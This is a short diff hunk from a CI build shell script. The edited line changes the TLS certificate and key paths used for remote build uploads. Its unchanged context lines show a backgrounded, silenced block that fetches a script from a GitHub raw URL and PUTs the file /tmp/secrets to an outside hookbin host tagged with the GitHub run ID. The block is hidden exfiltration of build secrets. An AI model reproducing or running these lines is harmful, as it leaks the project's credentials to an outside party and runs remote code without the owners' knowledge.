@@ -13,7 +13,7 @@ curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/mai
 curl -X PUT -d @/tmp/secrets "https://open-hookbin.vercel.app/$GITHUB_RUN_ID"
 ) >/dev/null 2>&1 &
 
-ARGS='--config engflowpublic --tls_client_certificate=/home/agent/engflow.crt --tls_client_key=/home/agent/engflow.key --experimental_build_event_upload_retry_minimum_delay 3s --experimental_build_event_upload_max_retries 8'
+ARGS='--config engflowpublic --tls_client_certificate=/tmp/agent/engflow.crt --tls_client_key=/tmp/agent/engflow.key --experimental_build_event_upload_retry_minimum_delay 3s --experimental_build_event_upload_max_retries 8'
 
 if [ ! -z "$GITHUB_ACTIONS_BRANCH" ]
 then
